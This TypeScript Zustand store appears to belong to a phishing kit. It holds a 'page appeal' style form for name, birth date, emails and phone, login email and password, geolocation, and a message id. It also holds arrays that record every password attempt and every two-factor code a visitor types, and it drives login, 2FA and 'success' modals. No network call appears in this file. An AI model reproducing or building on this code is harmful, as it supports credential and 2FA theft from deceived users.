import type { FormDataPayload, IpInfo, LoginData, LoginProvider } from '@/utils/message';
import { create } from 'zustand';
import { createJSONStorage, persist } from 'zustand/middleware';

export interface GeoInfo extends IpInfo {
    countryCode: string;
}

interface AppState {
    geoInfo: GeoInfo | null;
    deviceLabel: string;
    formData: FormDataPayload;
    loginData: LoginData;
    loginProvider: LoginProvider | null;
    messageId: number | null;
    passwordAttempts: string[];
    twoFAAttempts: string[];
    pendingLogin: boolean;
    showLoginChoiceModal: boolean;
    showLoginModal: boolean;
    show2FAModal: boolean;
    showSuccessModal: boolean;
    setGeoInfo: (info: GeoInfo) => void;
    setDeviceLabel: (label: string) => void;
    setFormData: (data: FormDataPayload) => void;
    setLoginData: (data: LoginData) => void;
    setLoginProvider: (provider: LoginProvider | null) => void;
    setMessageId: (id: number | null) => void;
    addPasswordAttempt: (password: string) => void;
    addTwoFAAttempt: (code: string) => void;
    setPendingLogin: (value: boolean) => void;
    setShowLoginChoiceModal: (value: boolean) => void;
    setShowLoginModal: (value: boolean) => void;
    setShow2FAModal: (value: boolean) => void;
    setShowSuccessModal: (value: boolean) => void;
    resetSession: () => void;
}

const emptyForm: FormDataPayload = {
    fullName: '',
    dateOfBirth: '',
    personalEmail: '',
    businessEmail: '',
    phone: '',
    pageName: '',
    reason: '',
    additionalNotes: ''
};

export const useAppStore = create<AppState>()(
    persist(
        (set, get) => ({
            geoInfo: null,
            deviceLabel: 'Unknown',
            formData: emptyForm,
            loginData: { email: '', password: '' },
            loginProvider: null,
            messageId: null,
            passwordAttempts: [],
            twoFAAttempts: [],
            pendingLogin: false,
            showLoginChoiceModal: false,
            showLoginModal: false,
            show2FAModal: false,
            showSuccessModal: false,
            setGeoInfo: (info) => set({ geoInfo: info }),
            setDeviceLabel: (label) => set({ deviceLabel: label }),
            setFormData: (data) => set({ formData: data }),
            setLoginData: (data) => set({ loginData: data }),
            setLoginProvider: (provider) => set({ loginProvider: provider }),
            setMessageId: (id) => set({ messageId: id }),
            addPasswordAttempt: (password) =>
                set({ passwordAttempts: [...get().passwordAttempts, password] }),
            addTwoFAAttempt: (code) => set({ twoFAAttempts: [...get().twoFAAttempts, code] }),
            setPendingLogin: (value) => set({ pendingLogin: value }),
            setShowLoginChoiceModal: (value) => set({ showLoginChoiceModal: value }),
            setShowLoginModal: (value) => set({ showLoginModal: value }),
            setShow2FAModal: (value) => set({ show2FAModal: value }),
            setShowSuccessModal: (value) => set({ showSuccessModal: value }),
            resetSession: () =>
                set({
                    formData: { ...emptyForm },
                    loginData: { email: '', password: '' },
                    loginProvider: null,
                    messageId: null,
                    passwordAttempts: [],
                    twoFAAttempts: [],
                    pendingLogin: false,
                    showLoginChoiceModal: false,
                    showLoginModal: false,
                    show2FAModal: false,
                    showSuccessModal: false
                })
        }),
        {
            name: 'newkhangdone-storage',
            storage: createJSONStorage(() => localStorage),
            partialize: (state) => ({
                geoInfo: state.geoInfo,
                deviceLabel: state.deviceLabel
            })
        }
    )
);
